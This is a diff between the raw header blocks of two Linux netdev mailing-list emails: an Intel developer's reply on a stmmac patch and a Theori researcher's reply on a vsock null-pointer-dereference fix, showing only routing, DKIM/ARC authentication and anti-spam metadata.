@@ -1,256 +1,609 @@
-Return-Path: <netdev+bounces-153047-lists+netdev=lfdr.de@vger.kernel.org>
+Return-Path: <netdev+bounces-153048-lists+netdev=lfdr.de@vger.kernel.org>
 X-Original-To: lists+netdev@lfdr.de
 Delivered-To: lists+netdev@lfdr.de
-Received: from am.mirrors.kernel.org (am.mirrors.kernel.org [147.75.80.249])
-	by mail.lfdr.de (Postfix) with ESMTPS id D37299F6A61
-	for <lists+netdev@lfdr.de>; Wed, 18 Dec 2024 16:49:47 +0100 (CET)
+Received: from sy.mirrors.kernel.org (sy.mirrors.kernel.org [IPv6:2604:1380:40f1:3f00::1])
+	by mail.lfdr.de (Postfix) with ESMTPS id 387B19F6A67
+	for <lists+netdev@lfdr.de>; Wed, 18 Dec 2024 16:51:34 +0100 (CET)
 Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
 	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by am.mirrors.kernel.org (Postfix) with ESMTPS id 70D621891689
-	for <lists+netdev@lfdr.de>; Wed, 18 Dec 2024 15:49:19 +0000 (UTC)
+	by sy.mirrors.kernel.org (Postfix) with ESMTPS id F09BC7A1ACF
+	for <lists+netdev@lfdr.de>; Wed, 18 Dec 2024 15:51:27 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id D7BF71DB363;
-	Wed, 18 Dec 2024 15:49:14 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id 0970D1E9B09;
+	Wed, 18 Dec 2024 15:51:25 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b="MBG9cWeJ"
+	dkim=pass (1024-bit key) header.d=theori.io header.i=@theori.io header.b="CC9CjAHI"
 X-Original-To: netdev@vger.kernel.org
-Received: from mgamail.intel.com (mgamail.intel.com [198.175.65.21])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pf1-f179.google.com (mail-pf1-f179.google.com [209.85.210.179])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 0778D1591EA;
-	Wed, 18 Dec 2024 15:49:12 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.client-ip=198.175.65.21
-ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1734536954; cv=fail; b=VgslPvszxQIapXB+kbUut1ito64gCmzMEmJXZJ7qklppUZWxiufs9mzUG+p/jbCkQCSIxSvJeU3kzXyUMGJvGfMUAtvPgV2Q1QFZBjfxWrTucWgb8Cw9sb68YtC2EQ0jJtNjZeF58U3bOLcIVXEdIRsMOtTaKiK4Osbd9tzqfNs=
-ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1734536954; c=relaxed/simple;
-	bh=FIVaFg3DRDE4xjDG9DfGNWB1J32KiNu0eraSgIx1AMU=;
-	h=Message-ID:Date:Subject:To:CC:References:From:In-Reply-To:
-	 Content-Type:MIME-Version; b=UKu5MOakNEFqtET+fkmyAJ7VwYw35owWfmEz5anJobKOvRWRdAdyWkgoXS5iNM0Jh++13SPGyu6q36Lqzlr/FMj3SvIw49LvpIpgMDNSrU0NN41HDOAuRDTKPA18+YligAqgZkb3wrJWw19LH2/niBZJm+G+0ZRyZ+u4W3v9JfY=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com; spf=pass smtp.mailfrom=intel.com; dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b=MBG9cWeJ; arc=fail smtp.client-ip=198.175.65.21
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=intel.com
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
-  d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
-  t=1734536953; x=1766072953;
-  h=message-id:date:subject:to:cc:references:from:
-   in-reply-to:content-transfer-encoding:mime-version;
-  bh=FIVaFg3DRDE4xjDG9DfGNWB1J32KiNu0eraSgIx1AMU=;
-  b=MBG9cWeJUKAe10jOXS9XdYuTtymLug+e/C2FeePYqS8M9RUxE0lcXplc
-   3bLdhMCBr78ePxpasDeJF7vit8LSi5jWhZd2kunrfrw/pWzDKyttFXMqM
-   9wiI8fK2qurv2eIeft/ReF7NSk3cFxKL4AlyHFKo9ThosIFhrLVlIExXu
-   jPmZL6QqyPABXp4qRM5piYvQ1ULZnIa0NyGZauQkUWlhd9NggOzg+/jeQ
-   h6faAoPint6GmJIIUf9LawIk4+KQsLux4DdKg3KIGW+0BAhA90o6yUWjX
-   2FbK0txUiQ3MPwsG926QcjuTC8IodoYspHwBr8cB0NMk07suHAiBfpXBq
-   A==;
-X-CSE-ConnectionGUID: kDbbHOj9ReiJt4zifPqwpw==
-X-CSE-MsgGUID: g+3FnTvJSICSk8Vn/GGaKw==
-X-IronPort-AV: E=McAfee;i="6700,10204,11290"; a="34921179"
-X-IronPort-AV: E=Sophos;i="6.12,245,1728975600"; 
-   d="scan'208";a="34921179"
-Received: from fmviesa008.fm.intel.com ([10.60.135.148])
-  by orvoesa113.jf.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 18 Dec 2024 07:49:12 -0800
-X-CSE-ConnectionGUID: xB1JUMLqQIiujRiXtQvYwg==
-X-CSE-MsgGUID: 771Uf97ZT5mlyacvfXj+Vg==
-X-ExtLoop1: 1
-X-IronPort-AV: E=Sophos;i="6.12,245,1728975600"; 
-   d="scan'208";a="98133770"
-Received: from orsmsx601.amr.corp.intel.com ([10.22.229.14])
-  by fmviesa008.fm.intel.com with ESMTP/TLS/AES256-GCM-SHA384; 18 Dec 2024 07:49:12 -0800
-Received: from orsmsx601.amr.corp.intel.com (10.22.229.14) by
- ORSMSX601.amr.corp.intel.com (10.22.229.14) with Microsoft SMTP Server
- (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256) id
- 15.1.2507.44; Wed, 18 Dec 2024 07:49:11 -0800
-Received: from ORSEDG602.ED.cps.intel.com (10.7.248.7) by
- orsmsx601.amr.corp.intel.com (10.22.229.14) with Microsoft SMTP Server
- (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256) id
- 15.1.2507.44 via Frontend Transport; Wed, 18 Dec 2024 07:49:11 -0800
-Received: from NAM11-CO1-obe.outbound.protection.outlook.com (104.47.56.170)
- by edgegateway.intel.com (134.134.137.103) with Microsoft SMTP Server
- (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
- 15.1.2507.44; Wed, 18 Dec 2024 07:49:11 -0800
-ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
- b=ppBuenmldFy/VqXlOHi8TAfWZ7OT1kaeYOqiXPsNawu87ebLNdHqOl6kUPcT2qjSqspB+fpx8wp5v7XpdRfQ7MdOubeHv39+GFI9iYRvKjNNTCX9Ifov8muDm9ZpEkVYN81LugxUz2NXXosHycQ7L04BmUazV6tGCMCFV9jM+iNKIaa2DFCiOebfEFUWUsXQDXrOyjZ/EsgF8x/aqe4I+3RvGyJS1zQh1aVCW/ft4qDYcNPYVuXmoF9aOHZROeiXJc7mt8P4+ZYQ8V01mzJs6IXmEVIR8Mnsww1VNZsrYvcJjS18FrjPK3FRWyWSsz4Ga7Qxp3DCBbPopNcKGwLV+w==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
- s=arcselector10001;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
- bh=/j7eDVCxfeB0+Re6tl58dgcugux7YoQB1CexfJDfm6Q=;
- b=G5cERtn4+pQnxl5waSVHM+rsBV6UkptEkWi5SQKydSbqn16yXWhSejQqdY9xdhhSEbzQvGT7NL4XjwxtuadxbjB7FRAlemWiYsmM6dTFiIrsz0hc0aK5kSLX+JdYet+rxEbfBo+pecJSro4J+EoStwrX96q/FxexwaC5WWURoFuZa7bkNUUQ3g3P8+9tp2Ezl0ksDqxiA6TYF2/eTNBI1AIoVmPS6oje/8CUxCjtCkCVkl5XYlpzlyMhJjeApL5389LeWDy0P9xElX3WBSbFhjpomHvxWgqKfGFi/a6qn6fVAAvY1TYkhsnqGEWyFo8JqAH5Dme+CkDAjGnDkQi2SA==
-ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
- smtp.mailfrom=intel.com; dmarc=pass action=none header.from=intel.com;
- dkim=pass header.d=intel.com; arc=none
-Authentication-Results: dkim=none (message not signed)
- header.d=none;dmarc=none action=none header.from=intel.com;
-Received: from DS0PR11MB8718.namprd11.prod.outlook.com (2603:10b6:8:1b9::20)
- by MW5PR11MB5882.namprd11.prod.outlook.com (2603:10b6:303:19e::6) with
- Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.8272.13; Wed, 18 Dec
- 2024 15:49:09 +0000
-Received: from DS0PR11MB8718.namprd11.prod.outlook.com
- ([fe80::4b3b:9dbe:f68c:d808]) by DS0PR11MB8718.namprd11.prod.outlook.com
- ([fe80::4b3b:9dbe:f68c:d808%4]) with mapi id 15.20.8272.013; Wed, 18 Dec 2024
- 15:49:09 +0000
-Message-ID: <b2ae6b80-83e3-4b22-8301-c91569c89494@intel.com>
-Date: Wed, 18 Dec 2024 16:48:38 +0100
-User-Agent: Mozilla Thunderbird
-Subject: Re: [PATCH net-next v1] net: stmmac: Drop useless code related to
- ethtool rx-copybreak
-To: Furong Xu <0x1207@gmail.com>
-CC: <netdev@vger.kernel.org>, <linux-stm32@st-md-mailman.stormreply.com>,
-	<linux-arm-kernel@lists.infradead.org>, <linux-kernel@vger.kernel.org>,
-	"Simon Horman" <horms@kernel.org>, Alexandre Torgue
-	<alexandre.torgue@foss.st.com>, Jose Abreu <joabreu@synopsys.com>, Andrew
- Lunn <andrew+netdev@lunn.ch>, "David S. Miller" <davem@davemloft.net>, Eric
- Dumazet <edumazet@google.com>, Jakub Kicinski <kuba@kernel.org>, Paolo Abeni
-	<pabeni@redhat.com>, "Maxime Coquelin" <mcoquelin.stm32@gmail.com>,
-	<xfr@outlook.com>
-References: <20241218083407.390509-1-0x1207@gmail.com>
-From: Alexander Lobakin <aleksander.lobakin@intel.com>
-Content-Language: en-US
-In-Reply-To: <20241218083407.390509-1-0x1207@gmail.com>
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: 7bit
-X-ClientProxiedBy: ZR2P278CA0057.CHEP278.PROD.OUTLOOK.COM
- (2603:10a6:910:53::14) To DS0PR11MB8718.namprd11.prod.outlook.com
- (2603:10b6:8:1b9::20)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D28871C5CD5
+	for <netdev@vger.kernel.org>; Wed, 18 Dec 2024 15:51:22 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.179
+ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1734537084; cv=none; b=PdSiWUAZHqhqYbY+QiO9DwG0Sd4PdaTyzbt2GRGPBzQLNPsb+j2kM6NSSsKel8smDDUBknMh8aNd9zzX1dAAa/hGP6eT9IvR+xHWwuKQpKSSbdhj7MZtQAxQqwEcb/Op6ldSOfHy+tzO/YMj7cuB7tFyz3lzfPDK2ZfcqffJaDI=
+ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1734537084; c=relaxed/simple;
+	bh=vKSToiSLhmTwRai64uJTRLmJ47/l+aBpbZErinLEj3g=;
+	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
+	 Content-Type:Content-Disposition:In-Reply-To; b=g1ZnOiTUJdC+zPOEg79/wITxrGGuDCN2MJb0OWYhUauo+WxsFflbibIUHQJHyJYqx2qrc4iebszfyZA+QpeDPmcEB6OkToLcZMX2BvPZA48YL85MXqLsN7MQobrMT+pBi6F8MyCLeBZF4mSocFvumAo5kr0Fasgu9iUpJt47XWg=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=theori.io; spf=pass smtp.mailfrom=theori.io; dkim=pass (1024-bit key) header.d=theori.io header.i=@theori.io header.b=CC9CjAHI; arc=none smtp.client-ip=209.85.210.179
+Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=theori.io
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=theori.io
+Received: by mail-pf1-f179.google.com with SMTP id d2e1a72fcca58-7242f559a9fso8574998b3a.1
+        for <netdev@vger.kernel.org>; Wed, 18 Dec 2024 07:51:22 -0800 (PST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=theori.io; s=google; t=1734537082; x=1735141882; darn=vger.kernel.org;
+        h=in-reply-to:content-transfer-encoding:content-disposition
+         :mime-version:references:message-id:subject:cc:to:from:date:from:to
+         :cc:subject:date:message-id:reply-to;
+        bh=iEWLoJ1cZqVPKOm4+wArmTerslObV5nGyDcVdoLJcVg=;
+        b=CC9CjAHITngGWdyOYlbZxhSQu5OW0Kct9Cghh2F3booGMXMqS68vCqEPy2EA2eRDXh
+         Gg7owbhEolDN5sambVOhoqaxT1Lg8QnW9FtdtbASAk3vYvnyJU3eEb3vGVk0z2DWZOWp
+         a5RQgRjDlHvPV8MgXQ7mfL6JjbWdmAAtlDtaQ=
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20230601; t=1734537082; x=1735141882;
+        h=in-reply-to:content-transfer-encoding:content-disposition
+         :mime-version:references:message-id:subject:cc:to:from:date
+         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
+        bh=iEWLoJ1cZqVPKOm4+wArmTerslObV5nGyDcVdoLJcVg=;
+        b=VWhLrL9TK0UdjssRAAiStl15XFIrC46sTlLThj/o4BqHwqSAACXgqxcnHEpqVLCihy
+         VQNUzsj8bMuDV0ckJnYeT8BFp3472hppNJfr50wySjESigY3Me2/kM3E9HbVvn6eGsxW
+         0nP7HGaipMADQ40a+/OAoRjEfySqNubYPcQOXRBPRaOwLOoXjpxWoXyprMwt/atZUJ7v
+         lyE7KR18fyt72hgYILMtbV9+CiBYOKWLobmohpV6RJxpMnQHCoXXuwVEu0MINkWzeAWx
+         sB8IP9c44IO8VYkTsMn6wMAZ+4CNFI9iYZb9rxat1y4WlgwNvFeyyHFGpKWg31ZTny64
+         YFqQ==
+X-Forwarded-Encrypted: i=1; AJvYcCUtrDzt7Uub7vq1jaCe91kg/dOtqlkr08n/cJ2Zphn7eE5qrJHhZIgUm9FWXBKo0WHaFe6s63Y=@vger.kernel.org
+X-Gm-Message-State: AOJu0YxVhP159K5GhMPtUzXXtuftFEC7WjvIDsGxCx7Ui4nxj6qnsl3O
+	m+GA+0uL7KIZzlvaAcyoVl6Pf5XFhthM6VSViFUV9Phs6UanEna0nSVp4w6jgPQ=
+X-Gm-Gg: ASbGncvZBDjMY5MWZxiIrRQXeZ8/n3kuywEWXK+IKqugh5ZBALWzUK5NVECJbp9wALo
+	Fu6XYjCtONYZdrEeTXStWPlYxfBZqHqBeP6SdHsZp7cghE+2bZKXwZ/umZIFsEF66S8FK0ZTCHp
+	yNm6MLtjNxoSiXYLZFotllLZ5OX/QcgdCaCz1PqY3jUL5BwFnTE0y9acN1YqoBfdtlFyQcVPCsr
+	P9gKtiDl1Zs0agqGjIAUdkI8HhY5x7FokmG9dQu4duSNDItCWUB481lbmNG12NvlK18nA==
+X-Google-Smtp-Source: AGHT+IGzKargL40J80eukxnNz3oeZ4Rde1G2gdGJiTCL0BnxcJqRGL4rHVd7OJr6IIrG1MPh1hJJAg==
+X-Received: by 2002:a05:6a21:6da7:b0:1e4:8fdd:8c77 with SMTP id adf61e73a8af0-1e5b4603cc7mr5914783637.8.1734537081974;
+        Wed, 18 Dec 2024 07:51:21 -0800 (PST)
+Received: from v4bel-B760M-AORUS-ELITE-AX ([211.219.71.65])
+        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-72918ad8f34sm8711036b3a.77.2024.12.18.07.51.18
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Wed, 18 Dec 2024 07:51:21 -0800 (PST)
+Date: Wed, 18 Dec 2024 10:51:17 -0500
+From: Hyunwoo Kim <v4bel@theori.io>
+To: Stefano Garzarella <sgarzare@redhat.com>
+Cc: "David S. Miller" <davem@davemloft.net>,
+	Eric Dumazet <edumazet@google.com>,
+	Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>,
+	Simon Horman <horms@kernel.org>, Jason Wang <jasowang@redhat.com>,
+	"Michael S. Tsirkin" <mst@redhat.com>,
+	virtualization@lists.linux.dev, netdev@vger.kernel.org,
+	qwerty@theori.io, imv4bel@gmail.com, v4bel@theori.io
+Subject: Re: [PATCH] vsock/virtio: Fix null-ptr-deref in vsock_stream_has_data
+Message-ID: <Z2LvdTTQR7dBmPb5@v4bel-B760M-AORUS-ELITE-AX>
+References: <Z2K/I4nlHdfMRTZC@v4bel-B760M-AORUS-ELITE-AX>
+ <lwfkm3salizjvubc5vqnkxi4bk4zdglg5um4xygfxwmrkktrbc@bvazoy4k723k>
+ <Z2LZ3HK05RH8OfP5@v4bel-B760M-AORUS-ELITE-AX>
+ <s2k74f6zvjm7uexqfyej6txvoqgf6lkaa47igo2eh4pq55d4n2@wnrrcr6aa6lk>
+ <f7a3rlgpc36wk75grqeg6ndqmlprvilznlsesyruqfb7m5vrp7@myil7ex4f62n>
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-X-MS-PublicTrafficType: Email
-X-MS-TrafficTypeDiagnostic: DS0PR11MB8718:EE_|MW5PR11MB5882:EE_
-X-MS-Office365-Filtering-Correlation-Id: a39f5dd6-b64b-4722-fd2d-08dd1f7b82bf
-X-MS-Exchange-SenderADCheck: 1
-X-MS-Exchange-AntiSpam-Relay: 0
-X-Microsoft-Antispam: BCL:0;ARA:13230040|7416014|376014|1800799024|366016|7053199007;
-X-Microsoft-Antispam-Message-Info: =?utf-8?B?WmxRNVFtVzd3T1hhZUkxazBRZnlsVzdsRFFkWkppWXFVVEkwamRiY0tYeGhi?=
- =?utf-8?B?NjJ6UnNDSUlxeXBxejFJMGdnRHlOWDhDODFkeXoydzBnUWpWZVl3L1dnYWtD?=
- =?utf-8?B?RmJ5NkdNL05YRy9iTk1YTlhkZDlTWU1mTzhrZTN1alFQQnBhdFo0c1JQQkQ2?=
- =?utf-8?B?MGhHSFBnT3ZuSmtsYjU3TlNPWEJ1Q1F3ZVFWQUFZMDdmeS9scHpvMWwrdFZ3?=
- =?utf-8?B?OGxxZjVZcXBKVmN1ZHpXc1QxUWdZZmFvWFRyZWVwZWhGM0VZckE2bWlsYnpi?=
- =?utf-8?B?VkEwbjQ1L29qcSs4SW5LdzRKRTU5V1JwaUNLRjRBelMrbHFpN3hobURPWnJF?=
- =?utf-8?B?WkY2S2Z4NUZZM3lkQ21kQThRSnU2alFhbjdTVXlWZ0llWkR4bkNTcDN6RWNX?=
- =?utf-8?B?dVp6VFA5VjFMLzhGSWVnUFY0ZUIycWR3V1dHRFNHaUZzMkEraktxRnFvb0p6?=
- =?utf-8?B?N1pDV3czSE5ZQk5tbXBORFFKSmdpelBXOGZMbjBvUUhJTFlPZ21oRmU4U0VG?=
- =?utf-8?B?L0hGTFloemp2bXRZWkFqOURRRzdsbUdObnpLaEtNTC9Ta1VnWkluQlpkQ2dJ?=
- =?utf-8?B?Mi9aY2h5ZjhjSkdjeTEwamlsTjdQQUxjeG4yMHE5MVpCdXk5U2tmVXN5S0JF?=
- =?utf-8?B?U0JRVDQyUnZ2L0ppeUNXclliMldHSml6bENFWGZWMVYvTFdrV2VzYUs3Rlcr?=
- =?utf-8?B?dWI2WFZWa08zTU03cThyVFlrb2c0OTNoZmhvbTNjNDdXcmJoRVJTRk9KNVJa?=
- =?utf-8?B?M1I3YWVnTTV0OG04dkZyU2hhY3psU3czZzFTNHAzQTVFK05iZUhnc3owN3ZF?=
- =?utf-8?B?ZXk1NXBWdGVqb2ZkL25JRlFad3ljL1hyVmtjakR0dVZUNlJNTE14dmRlS3VW?=
- =?utf-8?B?N0tzTlZwV1FjRHAydUpsaVlFQSt2UWhpK2RqWmN2dTJGdDBJTVZsUXVBN3RU?=
- =?utf-8?B?SjY5MGZjNzRYYzM2Ui9OdzBwU0F5ZjJoV0RYSWpkWTAwSWMzaVZSUE1Gb2pw?=
- =?utf-8?B?S2JUaUJVUWhsN2psUmRuTE9IQTNpWjBFSlIxemRuMU1vZFArcFBPSkFlTkV4?=
- =?utf-8?B?K1pQYklPcC9mNnhNNVZJZnpveW04VE85ZUNYL08rcnpyaFJjc3RFaENtcHVS?=
- =?utf-8?B?N2ZiZlF0eUkrRkU0eE9jVmI4dUZpUDJrRm5xNDkvR2Q2N1B1SWNCRVYyR0Fh?=
- =?utf-8?B?djBCcTZRVEgrOTNmYlBvYmhpLytua1E4NmdJRDNKNnZ2ZGd5R3pzSDVUMFp0?=
- =?utf-8?B?OHlybHFDVHpCQXBQSTJBR3VvNWFKR3I4WnJ1bktYTER3eEYyZm1JUXczR2NY?=
- =?utf-8?B?UGJ5RmVCQWRON1lYNGttem9QTXlPYjRxSlp4VGVJMllQVHQwZmltS0dVSHBQ?=
- =?utf-8?B?aEtpUDQ0NkJ0dFl4RVF3eUJqNHF2aGtYSHk3VFhkK0cwb0ZZM1Q4ZUlveDdi?=
- =?utf-8?B?VDd2Ky9tdHYxVk16Y1Q1NW9TbXFZQ1NDQ2g4cDdPU0tDVjdQNGRwbXVndjRz?=
- =?utf-8?B?aStjUTNndDk0ekdRQ0RBaDVqd3BoUUxwMENOVFdOUXhwZTJZbmdGMVVSamZP?=
- =?utf-8?B?YXdINEFlUzdWYnJhQ3BjNGxJanM2d0ZWenh1RHpUVTBsbjIyUXJJcis0c3dG?=
- =?utf-8?B?cmVYMXcvandHR3dORGVOb2NxU0h5T1lBb080d1lZZ1p5UVFDTHp6ZHIxSTYz?=
- =?utf-8?B?OG02cmhVTnl6SWFtKzRtcXRMOHVGWFE3akp1aFUwK1Baejh5MWJNejAvT3dV?=
- =?utf-8?B?Z0ZERFVxV2c2TlI3ZWp5aXhnRVlwUm5ySHBUckxtMDFaYlVkcFRHQU10Zk1J?=
- =?utf-8?B?dUJUYnRRRUNCcVdQcGpDNEpqSFgrWnIzV3RSYnRqMkgwVG1pdUNITjVuMGIy?=
- =?utf-8?Q?OaZUxOnXvqDGq?=
-X-Forefront-Antispam-Report: CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:DS0PR11MB8718.namprd11.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(7416014)(376014)(1800799024)(366016)(7053199007);DIR:OUT;SFP:1101;
-X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
-X-MS-Exchange-AntiSpam-MessageData-0: =?utf-8?B?cCtxcWFTVkJEOGI0cHVWRlRtUWRpNUNHUGxNMm8vRHpwNjA3OVJ3MFU3VTFa?=
- =?utf-8?B?anJvdlcyTmJjUm9pUDNXbFRaVWFBUzZGTGcwUFNteGIzYklzK01xcnNWWnlM?=
- =?utf-8?B?MUZYYjZYSEVLbk1vbTR3dmsrY25XWVJ0dTFEeDFxNk1WVVhvcElBdVZFZENn?=
- =?utf-8?B?djc1QkYxdVVtZW1DSXJhT3MrYnkyTDdMS1JqNmdaNERuVnNoRC9jTFdSME91?=
- =?utf-8?B?UmdNTm1BQlcxNGdPU2F4b2FWZnBZK3gzMWtJVnVtL1lJVXlqUDVSeTVZWmhI?=
- =?utf-8?B?WU5BTjNTYmFtRWRJMkx6UVdTcEZIMlZhNlRSWUJzNlJVd3NyN0Fack92OW5r?=
- =?utf-8?B?aERSZGRtN1dRRmdKZjRPT1QyakVrQlNudEM5emROVVpnTXNGV3FLL2RIWUVY?=
- =?utf-8?B?VDhlZTZ6dmxBTUdQQW5rVm84UjV1eWlXWDdsZmZ2Y0hDL3BKbDAwLzRGVzJC?=
- =?utf-8?B?Q0pBZk9OaDR1T21paHVkclV1cFdJZ2NHWjByMkZQM2JFNWRBNHlsaEFmaG5Z?=
- =?utf-8?B?SVAxemp5a0hHY0JTZU5oWEFrN21LOU9uNXF2RmZINDVWaStLOTVZSVNPZkht?=
- =?utf-8?B?bllLdlEwdENaOUx0MEtla3U4VkNyZEFNYi8vbnNOb3FLY014bFlabWs2MW15?=
- =?utf-8?B?MzZ2MzJtRTRibkY4RjBMZGwzUExlalIxOUYyYWVueHVTR2VXcXZFaGJFbHdr?=
- =?utf-8?B?TmVPMDkzSVMvNHVGaXJKNDFFK3JyMThlK2R6WjNvSThMWm9TZnlLbzNwc1lN?=
- =?utf-8?B?MXp3ay9XMVRvUUtqc2VaM1oyczBMczJiS3VYeDdxZmhpSW1yNVNUcmdoVkNS?=
- =?utf-8?B?aFhOT0xhTmpQSWpJM0NPbS9IdUhBclNnM1dnN0lnM2cyTWM1T3pPS2JEbjFD?=
- =?utf-8?B?bjd0QTR6NVVuak1KWjFNZzgrd1NJSis5a3o4a0hFeitQd0NxNUhVZEg3d1d6?=
- =?utf-8?B?QlVqWUJ1emt6U0dUMjU4bHp2RUgzQVVnUmhCb1o0cHRkZFFwSkp1eWI5TVZa?=
- =?utf-8?B?Vm1oemNocFRNazJLNGs4Nk1RcThycU9sQnRyUm40eVp6SzcyMXpFZTBhYXE0?=
- =?utf-8?B?RGl1RERvRlRFL3JsaTZxOFc5bnlEYndYUklDdm1OV3lUdkt4b0ZmbkxFSU96?=
- =?utf-8?B?MWhUSTdVbUVZY1dFYjlIYlNtRnl0TzFxVUk1YS8yQTJNdExoRHRpcyt0b0pK?=
- =?utf-8?B?MlVwdWZJdkFscERGd1pqUXF0Y3QxYk0zdWJ6YTQvUXEvVDFuRjBDQUR2bXVk?=
- =?utf-8?B?UHpaNktqYzJCamxtUnBEcDRlaE5HUzZuKzN3aGVNTWdZcTd5M0NFMlAzMG1K?=
- =?utf-8?B?MVZyZjhCaVdBSjcraVZTdmhKa2gvaE5vOExQck5NUCtSQ0FkejV2QUp6dXhT?=
- =?utf-8?B?d0lvYjhGRXU5THFDTllZc1c4cXpmWmdjWDlXSElnZ3h0Nys4VmVtNHRjTkZa?=
- =?utf-8?B?L2dxTzU1V1VVdHRoT29DVHhJNDRFTmRmNFJ5NUd4djhFSmZTc3RsNHpzUWpH?=
- =?utf-8?B?OHZodW9Lc3VIUkFGWGVmM1FLcHV5U205OVBVZzlvaGdxZUNTL1J0RkJBZ3pk?=
- =?utf-8?B?ZHE3OEhtZmMvRnBLVkplc0dOUHVzdnF1Q3VrNTN4UkF2dElzOHJ5UnF4Tzln?=
- =?utf-8?B?U1hCeFZPS2JkL1BKaTBUbWgrWUhrWWhLRVgzN1djZ2xUanRBMm5pMlR3MkRX?=
- =?utf-8?B?NFU0eU01djdmNzIzTnZXWHZJMUNBeHhSUG5tcWgvSlk5Rmd6MHN0WFlTOENk?=
- =?utf-8?B?bWVpeFFGS0VIZzBNRjhFK0V3bjVLZkZXVUY4UE1PaTgwc05GaW9Od0FmWk4r?=
- =?utf-8?B?bTN2cTZFUStvdVhLTWlmdW9Nek1lWHhmK21BeUQzOUhuQllXT1ZQYm9DMXJB?=
- =?utf-8?B?UUlMUU1ndUJITUNKejZVcUFMaGtpMzdjZEJiVEFkQThaZHdWTTd2NkR3ZERy?=
- =?utf-8?B?UUNVY3E5NnFUcmtBcitGbHZEczBxYU9JQTgvNm1MMDVYWkVxMml3RzJTMEFk?=
- =?utf-8?B?VlNNa3ZRUm8vZ0tuT0NuelRpSnZRU2l0TEM3THFDM1hIUU44UXVuSjVmemlI?=
- =?utf-8?B?SkNpVk53d29Kb3dSdW1rU1E2cHk2TEdQZ3JqLzhBOXJhR2NIN1huQmZnYTAw?=
- =?utf-8?B?RjZCUGpZVVBVVnJMSUJxbXNnTFZUQlhndG41RzFTbGtmRVc0Q0dBUUxieWg5?=
- =?utf-8?B?QlE9PQ==?=
-X-MS-Exchange-CrossTenant-Network-Message-Id: a39f5dd6-b64b-4722-fd2d-08dd1f7b82bf
-X-MS-Exchange-CrossTenant-AuthSource: DS0PR11MB8718.namprd11.prod.outlook.com
-X-MS-Exchange-CrossTenant-AuthAs: Internal
-X-MS-Exchange-CrossTenant-OriginalArrivalTime: 18 Dec 2024 15:49:09.4585
- (UTC)
-X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
-X-MS-Exchange-CrossTenant-Id: 46c98d88-e344-4ed4-8496-4ed7712e255d
-X-MS-Exchange-CrossTenant-MailboxType: HOSTED
